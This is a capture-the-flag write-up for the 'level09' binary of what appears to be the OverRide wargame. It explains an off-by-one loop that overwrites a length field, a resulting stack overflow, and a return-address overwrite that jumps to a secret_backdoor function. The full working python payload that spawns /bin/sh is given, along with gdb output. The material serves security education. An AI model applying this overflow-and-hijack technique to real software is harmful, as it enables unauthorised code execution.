This level ask a username and a message from stdin.

	--------------------------------------------
	|   ~Welcome to l33t-m$n ~    v1337        |
	--------------------------------------------
	>: Enter your username
	>>: ko
	>: Welcome, ko
	>: Msg @Unix-Dude
	>>: Hello World      
	>: Msg sent!

After checking the binary we can see that our password and message are stored in a struct containing **message[140] username[40] len**. (The order is important)

Inside the reversed code there is this interesting line
```c
for (int32_t i = 0; i <= 0x28; i += 1)
```
**0x28 = 40**, since i check until <= 40 it will loop 41 time letting us overflow from 1 byte rewriting len since its stored just after username.

Len is used in strncpy inside the function set_msg it means that we can write more than 140 char inside message. The max is 255 since its an overflow of only one byte.

Inside the binary there is a function called *secret_backdoor()* executing the parameter given. So we just have to rewrite the return address with secret_backdoor's firt instruction.

Let's check the differents address needed.

	Starting program: /home/users/level09/level09 < <(python -c 'print "B"*40+"\xff"+"\n"+"A"*200+"BBBB"')
	--------------------------------------------
	|   ~Welcome to l33t-m$n ~    v1337        |
	--------------------------------------------
	>: Enter your username
	>>: >: Welcome, BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB�>: Msg @Unix-Dude
	>>: >: Msg sent!

	Program received signal SIGSEGV, Segmentation fault.
	0x0000000a42424242 in ?? ()

We rewrite the return after 200 char inside message.

	(gdb) disas secret_backdoor 
	Dump of assembler code for function secret_backdoor:
	   0x000055555555488c <+0>:	push   %rbp
	   0x000055555555488d <+1>:	mov    %rsp,%rbp
	   0x0000555555554890 <+4>:	add    $0xffffffffffffff80,%rsp
	   ...

**0x000055555555488c** will be our targeted address.

The final command look like this

	(python -c 'print "B" * 40 + "\xff" + "\n" + "B" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh\n"'; cat) | ./level09

+ `"B" * 40` To fill the username.
+ `+ "\xff"` It's gonna set len to 255.
+ `"B" * 200` To fill message until targeted overflow.
+ `"\x8c\x48\x55\x55\x55\x55\x00\x00"` secret_backdoor's 1st instruction address.
+ `""/bin/sh\n""` secret_backdoor's parameter.

**"\n"** are used to pass between variables like username message etc.

	level09@OverRide:~$ (python -c 'print "B" * 40 + "\xff" + "\n" + "B" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh\n"'; cat) | ./level09
	--------------------------------------------
	|   ~Welcome to l33t-m$n ~    v1337        |
	--------------------------------------------
	>: Enter your username
	>>: >: Welcome, BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB�>: Msg @Unix-Dude
	>>: >: Msg sent!
	whoami
	end

Finished !